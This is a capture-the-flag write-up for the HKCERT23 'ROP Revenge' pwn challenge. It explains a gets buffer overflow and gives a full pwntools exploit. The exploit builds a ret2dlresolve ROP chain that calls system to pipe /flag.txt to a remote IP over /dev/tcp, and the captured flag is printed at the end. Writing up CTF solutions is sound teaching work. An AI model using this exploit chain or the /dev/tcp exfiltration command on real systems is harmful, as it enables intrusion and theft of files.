# ROP Revenge

## Challenge

Buffer-overflow challenge but stdout and stderr are closed.

## Solution

There is a call to `gets` with no PIE and no canary, so we can trivially execute a ROP chain.

We can't get a libc leak as stdout and stderr are closed, but we can call libc functions using ret2dlresolve.

We use this to call `system` and use bash to send the flag to a listener by piping into /dev/tcp.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.hkcert23.pwnable.hk --port 28352 chall/src/chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall/src/chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.hkcert23.pwnable.hk'
port = int(args.PORT or 28352)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=[b'bash -c "cat /flag.txt > /dev/tcp/41.41.41.41/1337"'])

rop = ROP(exe)
rop.gets(dlresolve.data_addr)
rop.raw(rop.ret)
rop.ret2dlresolve(dlresolve)

rop.gets(dlresolve.data_addr)

io.sendline(flat({0x78: rop.chain()}))
io.sendline(dlresolve.payload)

io.interactive()
```

## Flag

```
hkcert23{n0_3y3_s3E}
```